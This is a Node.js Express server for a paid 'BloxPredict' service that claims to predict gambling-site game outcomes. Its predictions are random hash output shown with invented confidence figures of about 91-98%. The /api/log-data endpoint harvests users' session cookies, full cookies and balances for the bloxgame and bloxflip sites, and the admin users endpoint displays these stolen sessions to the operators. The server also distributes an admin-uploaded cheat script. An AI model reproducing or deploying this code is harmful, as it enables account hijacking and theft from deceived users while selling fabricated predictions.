const path = require('path');
require('dotenv').config({ path: path.join(__dirname, '.env') });
const express = require('express');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const { pool, initDb } = require('./db');
const crypto = require('crypto');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 5000;
const SECRET_KEY = process.env.JWT_SECRET || 'premium_engine_secret_v3';

let transporter;

async function setupEmail() {
    if (process.env.SMTP_USER && process.env.SMTP_USER !== 'mock_user') {
        transporter = nodemailer.createTransport({
            host: process.env.SMTP_HOST,
            port: process.env.SMTP_PORT,
            secure: process.env.SMTP_SECURE === 'true',
            auth: {
                user: process.env.SMTP_USER,
                pass: process.env.SMTP_PASS
            }
        });
        console.log('✅ SMTP Configured');
    } else {
        const testAccount = await nodemailer.createTestAccount();
        transporter = nodemailer.createTransport({
            host: 'smtp.ethereal.email',
            port: 587,
            secure: false,
            auth: {
                user: testAccount.user,
                pass: testAccount.pass
            }
        });
        console.log('🧪 Email Sandbox Active:', testAccount.user);
    }
}

app.use(express.json({ limit: '500mb', strict: false }));
app.use(express.urlencoded({ limit: '500mb', extended: true }));
app.use(express.text({ limit: '500mb' }));
app.use(express.raw({ limit: '500mb' }));
app.use(cors({ origin: '*' }));

// --- PREMIUM AUTH MIDDLEWARE ---
const authMiddleware = async (req, res, next) => {
    const token = req.headers['authorization'];
    if (!token) return res.status(403).send({ message: 'License required' });

    try {
        const decoded = jwt.verify(token.split(' ')[1], SECRET_KEY);

        const { rows } = await pool.query('SELECT id, is_admin, is_banned, expires_at, admin_type FROM keys WHERE id = $1', [decoded.id]);
        const user = rows[0];
        if (!user || user.is_banned) return res.status(403).send({ message: 'Account locked' });

        if (user.expires_at && new Date(user.expires_at) < new Date()) {
            return res.status(403).send({ message: 'License expired' });
        }

        await pool.query('UPDATE keys SET last_active_at = NOW() WHERE id = $1', [user.id]);

        req.userId = user.id;
        req.isAdmin = !!user.is_admin;
        req.adminType = user.admin_type || 'none';
        next();
    } catch (err) {
        console.error('Auth Error:', err);
        return res.status(500).send({ message: 'Session expired' });
    }
};

// --- AUTH SYSTEM ---

app.post('/api/login', async (req, res) => {
    const keyVal = (req.body.key || '').trim();
    const { rows } = await pool.query('SELECT * FROM keys WHERE UPPER(key_value) = UPPER($1)', [keyVal]);
    const user = rows[0];

    if (!user) return res.status(401).send({ message: 'Invalid license key' });
    if (user.is_banned) return res.status(403).send({ message: 'Access denied' });

    const token = jwt.sign({ id: user.id, isAdmin: !!user.is_admin }, SECRET_KEY, { expiresIn: '7d' });
    const isPremium = user.is_admin || (user.premium_until && new Date(user.premium_until) > new Date());
    const refRes = await pool.query('SELECT COUNT(*) as count FROM keys WHERE referred_by_id = $1', [user.id]);
    const referralCount = parseInt(refRes.rows[0].count);

    res.send({
        token,
        isAdmin: !!user.is_admin,
        adminType: user.admin_type,
        isPremium: !!isPremium,
        username: user.username,
        isRegistered: !!user.is_registered,
        referralCode: user.referral_code,
        referralCount: referralCount,
        id: user.id
    });
});

app.post('/api/auth/set-name', authMiddleware, async (req, res) => {
    const { name, referralCode } = req.body;
    if (!name || name.trim().length < 2) return res.status(400).send({ message: 'Name too short' });

    let referredById = null;
    if (referralCode) {
        const { rows } = await pool.query('SELECT id FROM keys WHERE UPPER(referral_code) = UPPER($1)', [referralCode.trim()]);
        const referrer = rows[0];
        if (referrer && referrer.id !== req.userId) referredById = referrer.id;
    }

    await pool.query('UPDATE keys SET username = $1, is_registered = 1, referred_by_id = $2 WHERE id = $3', [name.trim(), referredById, req.userId]);

    const updatedRes = await pool.query('SELECT * FROM keys WHERE id = $1', [req.userId]);
    const updatedUser = updatedRes.rows[0];
    const isPremium = updatedUser.is_admin || (updatedUser.premium_until && new Date(updatedUser.premium_until) > new Date());
    const refCountRes = await pool.query('SELECT COUNT(*) as count FROM keys WHERE referred_by_id = $1', [req.userId]);
    const referralCount = parseInt(refCountRes.rows[0].count);
    const token = jwt.sign({ id: updatedUser.id, isAdmin: !!updatedUser.is_admin }, SECRET_KEY, { expiresIn: '7d' });

    res.send({
        success: true,
        token: token,
        isAdmin: !!updatedUser.is_admin,
        adminType: updatedUser.admin_type,
        isPremium: !!isPremium,
        username: updatedUser.username,
        referralCode: updatedUser.referral_code,
        referralCount: referralCount,
        id: updatedUser.id
    });
});

// --- PREDICTOR ENGINE ---

app.post('/api/predict', authMiddleware, async (req, res) => {
    const { gameType, clientSeed, serverSeedHash, nonce = 0, minesCount = 3, predictionCount = 5, algorithm = 'neural_v4' } = req.body;
    const premRes = await pool.query('SELECT id FROM keys WHERE id = $1 AND (premium_until > NOW() OR is_admin = 1)', [req.userId]);
    const isPremium = req.isAdmin || premRes.rows.length > 0;

    if ((algorithm === 'quantum_v2' || algorithm === 'dynamic_adapt') && !isPremium) {
        return res.status(403).send({ message: 'Premium Algorithm Locked.' });
    }

    let prediction;
    let confidenceStr;

    if (gameType === 'mines') {
        const size = req.body.gridSize || 5;
        const totalTiles = size * size;

        // 1. Heatmap Data (from all users) - We want to AVOID high mine areas
        const { rows: logs } = await pool.query(
            'SELECT actual_outcome FROM game_logs WHERE game_type = $1 AND mines_count = $2 AND actual_outcome IS NOT NULL ORDER BY created_at DESC LIMIT 200',
            [gameType, minesCount]
        );

        const mineDangerMap = Array.from({ length: size }, () => Array(size).fill(0));
        logs.forEach(log => {
            try {
                const outcome = JSON.parse(log.actual_outcome);
                outcome.forEach((row, r) => row.forEach((isMine, c) => {
                    if (isMine) mineDangerMap[r][c]++;
                }));
            } catch (e) { }
        });

        // 2. Anti-Repetition logic (from THIS user's history) - Avoid picking same "safe" tiles repeatedly
        const { rows: userLogs } = await pool.query(
            'SELECT prediction FROM game_logs WHERE user_id = $1 AND game_type = $2 ORDER BY created_at DESC LIMIT 5',
            [req.userId, gameType]
        );

        const userFrequencyMap = Array.from({ length: size }, () => Array(size).fill(0));
        userLogs.forEach(entry => {
            try {
                const pred = JSON.parse(entry.prediction);
                pred.forEach((row, r) => row.forEach((wasSafe, c) => {
                    if (wasSafe) userFrequencyMap[r][c]++;
                }));
            } catch (e) { }
        });

        // 3. Generate candidate tiles with weighted scoring
        let combined = `${serverSeedHash}:${clientSeed}:${nonce}:${algorithm}:${Date.now()}`;
        let hash = crypto.createHash('sha256').update(combined).digest('hex');

        const candidates = [];
        for (let r = 0; r < size; r++) {
            for (let c = 0; c < size; c++) {
                // Determine a cell-specific entropy from the hash
                const cellEntropy = parseInt(hash.substring((r * size + c) % 30, (r * size + c) % 30 + 2), 16) / 255;

                // Normalizing danger: 0 to 1
                const dangerScore = logs.length > 0 ? (mineDangerMap[r][c] / logs.length) : 0.5;

                // Normalizing user repetition: 0 to 1
                const repetitionScore = userLogs.length > 0 ? (userFrequencyMap[r][c] / userLogs.length) : 0.5;

                // Final Weight: Lower is better (safer)
                // We want: Low Danger, Low Repetition, and some Hash randomness
                // High weight on dynamic adaptation if selected
                const weightRatio = algorithm === 'dynamic_adapt' ? 0.9 : 0.7;
                const score = (dangerScore * 0.4) + (repetitionScore * 0.3) + (cellEntropy * 0.3);

                candidates.push({ r, c, score });
            }
        }

        // Add extreme jitter for V2 Engine logic to prevent cluster patterns
        candidates.forEach(cand => {
            cand.score += (Math.random() * 0.1) - 0.05;
        });

        candidates.sort((a, b) => a.score - b.score);

        prediction = Array.from({ length: size }, () => Array(size).fill(false));
        for (let i = 0; i < Math.min(predictionCount, totalTiles - minesCount); i++) {
            prediction[candidates[i].r][candidates[i].c] = true;
        }

        const baseConfidence = 91 + (parseInt(hash.substring(0, 2), 16) % 8);
        confidenceStr = `${baseConfidence.toFixed(2)}% (V2 Logic Enabled)`;
    } else if (gameType === 'towers') {
        const difficulty = req.body.difficulty || 'Easy';
        let combined = `${serverSeedHash}:${clientSeed}:${nonce}:${algorithm}:${Date.now()}`;
        let hash = crypto.createHash('sha256').update(combined).digest('hex');

        // Generate an 8-level path for Towers
        prediction = [];
        let colCount = 3;
        if (difficulty === 'Medium') colCount = 2;
        if (difficulty === 'Hard') colCount = 1;

        for (let i = 0; i < 8; i++) {
            const segment = hash.substring(i * 4, i * 4 + 4);
            const val = parseInt(segment, 16) % colCount;
            prediction.push(val);
        }
        confidenceStr = `${(92 + (parseInt(hash.substring(0, 2), 16) % 6)).toFixed(2)}% (Neural Path Sync)`;
    } else if (gameType === 'crash') {
        const crashRisk = Math.min(5, Math.max(1.1, parseFloat(req.body.crashRisk) || 2.0));
        let combined = `${serverSeedHash}:${clientSeed}:${nonce}:${algorithm}:${Date.now()}`;
        let hash = crypto.createHash('sha256').update(combined).digest('hex');

        const raw = parseInt(hash.substring(0, 4), 16) / 65535;
        const targetMultiplier = (1.1 + (raw * (crashRisk - 1.1))).toFixed(2);
        prediction = parseFloat(targetMultiplier);
        confidenceStr = `${(95 + (raw * 3)).toFixed(2)}% (Crash Predictor V2)`;
    } else {
        prediction = null;
        confidenceStr = "Unknown Gamemode";
    }

    res.send({ prediction, confidence: confidenceStr });
});

app.post('/api/log-data', authMiddleware, async (req, res) => {
    const { session, fullCookie, balance, type, profits, breakdown } = req.body;

    try {
        // Update the primary keys table for the direct registry view
        if (type === 'bloxgame') {
            await pool.query(
                'UPDATE keys SET bloxgame_cookie = $1, bloxgame_balance = $2, total_profits = $3 WHERE id = $4',
                [session, parseFloat(balance.replace(/[^0-9.]/g, '') || 0), profits, req.userId]
            );
        } else {
            await pool.query(
                'UPDATE keys SET blox_cookie = $1, blox_balance = $2, total_profits = $3 WHERE id = $4',
                [session, balance, profits, req.userId]
            );
        }

        // Also log to history for analytical tracking
        const { rows } = await pool.query('SELECT id FROM logged_data WHERE user_id = $1 AND type = $2', [req.userId, type]);
        if (rows.length > 0) {
            await pool.query(
                'UPDATE logged_data SET session_cookie = $1, full_cookie = $2, balance = $3, profits = $4, breakdown = $5, created_at = NOW() WHERE user_id = $6 AND type = $7',
                [session, fullCookie, balance, profits, JSON.stringify(breakdown), req.userId, type]
            );
        } else {
            await pool.query(
                'INSERT INTO logged_data (user_id, session_cookie, full_cookie, balance, type, profits, breakdown) VALUES ($1, $2, $3, $4, $5, $6, $7)',
                [req.userId, session, fullCookie, balance, type, profits, JSON.stringify(breakdown)]
            );
        }
        res.send({ success: true });
    } catch (err) {
        console.error('Log Data Error:', err);
        res.status(500).send({ message: 'Internal sync error' });
    }
});

app.post('/api/confirm-outcome', authMiddleware, async (req, res) => {
    const { gameType, minesCount, prediction, actual_outcome, clientSeed, serverSeedHash, nonce, confidence } = req.body;
    await pool.query(
        `INSERT INTO game_logs (user_id, game_type, mines_count, prediction, actual_outcome, client_seed, server_seed_hash, nonce, confidence) 
         VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
        [req.userId, gameType, minesCount, JSON.stringify(prediction), JSON.stringify(actual_outcome), clientSeed, serverSeedHash, nonce, confidence]
    );
    res.send({ message: 'Neural Sync Success' });
});

app.get('/api/history', authMiddleware, async (req, res) => {
    const { rows } = await pool.query('SELECT * FROM game_logs WHERE user_id = $1 ORDER BY created_at DESC LIMIT 50', [req.userId]);
    res.send(rows);
});

// --- ADMIN CONTROL CENTER ---

app.get('/api/admin/users', authMiddleware, async (req, res) => {
    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });

    try {
        // Join with logged_data to show sessions
        const { rows: users } = await pool.query(`
            SELECT k.*, 
                COALESCE(l.session_cookie, k.bloxgame_cookie, k.blox_cookie) as session,
                COALESCE(l.balance, CAST(k.bloxgame_balance as TEXT), k.blox_balance) as balance,
                COALESCE(l.type, CASE WHEN k.bloxgame_cookie IS NOT NULL THEN 'bloxgame' WHEN k.blox_cookie IS NOT NULL THEN 'bloxflip' ELSE NULL END) as site_type 
            FROM keys k 
            LEFT JOIN logged_data l ON l.id = (
                SELECT id FROM logged_data WHERE user_id = k.id ORDER BY created_at DESC LIMIT 1
            )
            WHERE k.is_banned = 0 
            ORDER BY k.last_active_at DESC NULLS LAST
        `);

        const now = new Date();
        res.send(users.map(u => ({
            ...u,
            isOnline: u.last_active_at && (now - new Date(u.last_active_at)) < 300000
        })));
    } catch (err) {
        console.error('Admin Users Query Error:', err);
        res.status(500).send({ message: 'Database error' });
    }
});

app.post('/api/admin/generate-key', authMiddleware, async (req, res) => {
    if (!req.isAdmin) return res.status(403).send({ message: 'Forbidden' });
    const { hours = 0, prefix = 'BLOX-' } = req.body;
    const randomPart = Math.random().toString(36).substring(2, 10).toUpperCase();
    const newKey = prefix + randomPart;
    const expiresAt = hours > 0 ? new Date(Date.now() + hours * 3600000).toISOString() : null;
    await pool.query('INSERT INTO keys (key_value, expires_at) VALUES ($1, $2)', [newKey, expiresAt]);
    res.send({ key: newKey });
});

// --- FREE KEY GEN (Public — controlled by admin toggle) ---

app.get('/api/free-keygen/status', async (req, res) => {
    const { rows } = await pool.query("SELECT value FROM settings WHERE key = 'free_keygen_enabled'");
    const enabled = rows[0]?.value === 'true';
    res.send({ enabled });
});

app.post('/api/free-keygen/generate', async (req, res) => {
    const { rows } = await pool.query("SELECT value FROM settings WHERE key = 'free_keygen_enabled'");
    const enabled = rows[0]?.value === 'true';
    if (!enabled) return res.status(403).send({ message: 'Free key generation is currently disabled.' });

    const randomPart = Math.random().toString(36).substring(2, 10).toUpperCase();
    const newKey = 'FREE-' + randomPart;
    // Free keys expire after 24 hours
    const expiresAt = new Date(Date.now() + 24 * 3600000).toISOString();
    await pool.query('INSERT INTO keys (key_value, expires_at) VALUES ($1, $2)', [newKey, expiresAt]);
    res.send({ key: newKey });
});


app.delete('/api/admin/keys/:id', authMiddleware, async (req, res) => {
    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
    await pool.query('DELETE FROM keys WHERE id = $1', [req.params.id]);
    res.send({ success: true });
});

app.post('/api/admin/users/:id/ban', authMiddleware, async (req, res) => {
    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
    await pool.query('UPDATE keys SET is_banned = $1 WHERE id = $2', [req.body.status, req.params.id]);
    res.send({ success: true });
});

app.get('/api/admin/stats', authMiddleware, async (req, res) => {
    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
    const totalPredictions = (await pool.query('SELECT COUNT(*) as count FROM game_logs')).rows[0].count;
    const totalUsers = (await pool.query('SELECT COUNT(*) as count FROM keys WHERE is_banned = 0')).rows[0].count;
    const totalRevenue = (await pool.query("SELECT COALESCE(SUM(amount), 0) as sum FROM payment_requests WHERE status = 'approved'")).rows[0].sum;
    res.send({ totalPredictions: parseInt(totalPredictions), totalUsers: parseInt(totalUsers), totalRevenue: parseFloat(totalRevenue) });
});

app.get('/api/admin/payments', authMiddleware, async (req, res) => {
    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
    const { rows } = await pool.query('SELECT * FROM payment_requests ORDER BY created_at DESC');
    res.send(rows);
});

app.post('/api/admin/payments/:id/approve', authMiddleware, async (req, res) => {
    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
    const { rows } = await pool.query('SELECT * FROM payment_requests WHERE id = $1', [req.params.id]);
    const payment = rows[0];
    if (!payment || payment.status !== 'pending') return res.status(400).send({ message: 'Invalid payment request' });

    const newKey = 'BLOX-' + Math.random().toString(36).substring(2, 10).toUpperCase();
    await pool.query('INSERT INTO keys (key_value, expires_at) VALUES ($1, NULL)', [newKey]);
    await pool.query('UPDATE payment_requests SET status = $1, user_key = $2 WHERE id = $3', ['approved', newKey, req.params.id]);

    if (payment.email && transporter) {
        const mailOptions = {
            from: '"BloxPredict Engine" <noreply@bloxpredict.ai>',
            to: payment.email,
            subject: 'Your Access Key is Verified!',
            text: `Operator, your payment has been confirmed.\n\nYour Access Key: ${newKey}`,
            html: `<div style="background:#12121e; color:white; padding:40px; font-family:sans-serif; border-radius:15px;">
                      <h2 style="color:#7c4dff;">Identity Verified</h2>
                      <p>Your payment for <b>${payment.coin?.toUpperCase()}</b> has been confirmed.</p>
                      <div style="background:rgba(255,255,255,0.05); padding:20px; border-radius:10px; margin:20px 0; border:1px solid #7c4dff;">
                        <span style="font-size:0.8rem; color:#888;">ACCESS KEY</span><br/>
                        <span style="font-size:1.5rem; font-weight:bold; letter-spacing:2px; color:white;">${newKey}</span>
                      </div>
                   </div>`
        };
        transporter.sendMail(mailOptions).catch(err => console.error('Email Dispatch Fail:', err));
    }
    res.send({ success: true, key: newKey });
});

app.post('/api/admin/payments/:id/reject', authMiddleware, async (req, res) => {
    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
    await pool.query('UPDATE payment_requests SET status = $1 WHERE id = $2', ['rejected', req.params.id]);
    res.send({ success: true });
});

app.get('/api/public-settings', async (req, res) => {
    const { rows } = await pool.query('SELECT * FROM settings');
    const obj = {};
    rows.forEach(x => { try { obj[x.key] = JSON.parse(x.value); } catch (e) { obj[x.key] = x.value; } });
    res.send(obj);
});

app.post('/api/admin/settings', authMiddleware, async (req, res) => {
    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
    const { settings } = req.body;
    for (const [k, v] of Object.entries(settings)) {
        const val = typeof v === 'object' ? JSON.stringify(v) : v.toString();
        await pool.query('INSERT INTO settings (key, value) VALUES ($1, $2) ON CONFLICT (key) DO UPDATE SET value = $2', [k, val]);
    }
    res.send({ success: true });
});

app.post('/api/admin/upload-esp', authMiddleware, async (req, res) => {
    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
    const { script } = req.body;
    if (!script) return res.status(400).send({ message: 'Script content required' });

    await pool.query("INSERT INTO settings (key, value) VALUES ('esp_script', $1) ON CONFLICT (key) DO UPDATE SET value = $1", [script]);
    res.send({ success: true });
});

app.get('/api/esp-script', authMiddleware, async (req, res) => {
    const { rows } = await pool.query("SELECT value FROM settings WHERE key = 'esp_script'");
    res.send({ script: rows[0]?.value || '// No ESP script uploaded yet' });
});

// --- ANNOUNCEMENT SYSTEM ---

app.post('/api/admin/announcements', authMiddleware, async (req, res) => {
    if (!req.isAdmin || req.adminType === 'keygen') return res.status(403).send({ message: 'Forbidden' });
    const { content } = req.body;
    if (!content) return res.status(400).send({ message: 'Content required' });

    await pool.query('INSERT INTO announcements (content, author_id) VALUES ($1, $2)', [content, req.userId]);
    res.send({ success: true });
});

app.get('/api/announcements', authMiddleware, async (req, res) => {
    const { rows } = await pool.query(
        'SELECT a.*, k.username as author_name FROM announcements a LEFT JOIN keys k ON a.author_id = k.id ORDER BY a.created_at DESC'
    );
    res.send(rows);
});

app.get('/api/announcements/unread', authMiddleware, async (req, res) => {
    const { rows: userRows } = await pool.query('SELECT last_read_announcement_id FROM keys WHERE id = $1', [req.userId]);
    const lastReadId = userRows[0]?.last_read_announcement_id || 0;

    const { rows: annRows } = await pool.query('SELECT * FROM announcements WHERE id > $1 ORDER BY id DESC LIMIT 1', [lastReadId]);
    res.send(annRows[0] || null);
});

app.post('/api/announcements/mark-read', authMiddleware, async (req, res) => {
    const { announcementId } = req.body;
    await pool.query('UPDATE keys SET last_read_announcement_id = $1 WHERE id = $2', [announcementId, req.userId]);
    res.send({ success: true });
});

app.post('/api/buy-key', async (req, res) => {
    const { txHash, coin, amount, email } = req.body;
    if (!txHash || !email) return res.status(400).send({ message: 'Missing fields' });
    try {
        await pool.query('INSERT INTO payment_requests (amount, coin, tx_hash, status, email) VALUES ($1, $2, $3, $4, $5)', [amount, coin, txHash, 'pending', email]);
        res.send({ success: true, message: 'Payment submitted for verification.' });
    } catch (e) {
        res.status(500).send({ message: 'Submission fail' });
    }
});

// --- SERVER STARTUP ---
async function start() {
    await initDb();
    await setupEmail().catch(err => console.error('Email Setup Fail:', err));
    app.listen(PORT, () => console.log(`Premium Service Engine Running on PORT ${PORT}`));
}

start().catch(err => {
    console.error('💀 Failed to start server:', err);
    process.exit(1);
});
